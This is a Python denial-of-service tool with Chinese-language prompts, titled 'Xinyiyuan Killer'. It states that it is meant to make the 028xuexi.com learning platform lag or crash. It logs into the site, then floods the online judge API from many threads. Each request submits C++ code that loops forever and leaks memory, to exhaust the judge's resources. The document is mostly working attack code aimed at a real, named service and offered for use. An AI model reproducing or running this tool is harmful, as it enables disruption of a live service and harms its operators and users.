import thread, requests, threading, queue

url = "https://base.028xuexi.com/api/question/judgmentQuestionAsync"

payload = {
        'id': "4060",
        'src': '''
# include <bits/stdc++.h>
# include <chrono>
using namespace std;
int main(){
    char *p = NULL;
    long long a = 1;																																																																																																																													do
	{
    *&p = (char *) malloc(sizeof(char) * 1024);
    memset(p, '666', 1024);
    auto t = chrono::duration_cast<chrono::seconds>(chrono::system_clock::now().time_since_epoch()).count();
	a = (LONG_LONG_MAX / t < a) ? a/t : a*t;
	}
	while(true)                                                                      																																																																																																							;
	    cout << "The end";
	return!!a?!(bool)!(int)!a:!(bool)!a;
}
'''
    }

message_queue = queue.Queue()

def get_token(user_name, password):
    """登录并返回 token"""
    login_url = "https://base.028xuexi.com/api/login/account"
    payload = {
        "code": "",
        "account": f"{user_name}",
        "password": f"{password}",
        "scene": "1",
        "terminal": "4",
    }

    try:
        login_res = requests.post(url=login_url, data=payload)
    except Exception as e:
        print(f"登录时发生异常: {e}")
        return None

    if login_res.status_code != 200:
        print(f"登录失败, 状态码: {login_res.status_code}")
        return None

    json_res: dict = login_res.json()

    if json_res.get("code") != 1:
        print(f"登录失败, 响应: {json_res}")
        return None

    return json_res.get("data", {"token": None}).get("token")


def kill_thread(name, token):
    """攻击线程"""
    out = message_queue.put
    out(f"攻击线程 {name} 开始运行")
    while True:
        res = requests.post(url=url, data=payload, headers={"token": token})
        out(f'攻击线程 {name} 收到响应: {res.text}')

def message_thead(name):
    """消息线程"""
    print(f"消息线程 {name} 开始运行")
    while True:
        message = message_queue.get()
        print(f"获取到消息: {message}")

def kill(token, kill_theard_count):
    """发送请求"""
    print(f"正在创建线程...")
    thread.add_many_thread(
        [message_thead, lambda name: kill_thread(name, token)],
        kill_theard_count + 1,  # 攻击线程数量 + 消息线程数量
    )


if __name__ == "__main__":
    print(
        """欢迎使用 新易元杀手
本工具用于使新易元服务器卡顿或崩溃。在开始前，请先前往新易元(https://base.028xuexi.com/)注册账户，然后在此处输入用户名与密码"""
    )
    user_name = input("请输入用户名: ")
    password = input("请输入密码: ")
    print("正在登录，请稍后...")
    token = get_token(user_name, password)
    if not token:
        print("获取 token 失败，请检查用户名与密码是否正确，然后重新运行本工具")
        input('按 Enter 键退出...')
        exit()
    print(
        f"新易元杀手 已获取到 token (token 是一种临时的登录凭证，本工具使用它向服务器发送请求)。此外，由于本工具已登录到您的账户，您在浏览器中的登录现已退出。攻击期间，请勿重新登录，避免导致 token 无效，待攻击结束后，方可重新登录\n您的 token 为: {token}"
    )
    kill_theard_count = input('请输入攻击线程数量(数量越多攻击效果越好，但也会消耗更多资源，建议 100 左右): ')
    try:
        kill_theard_count = int(kill_theard_count)
        if kill_theard_count <= 0:
            raise ValueError
    except:
        print('输入数据有误，请输入正整数')
        input('按 Enter 键退出...')
        exit()
    input("请按 Enter 键开始攻击 | 如要停止，请关闭窗口...")
    kill(token, kill_theard_count)
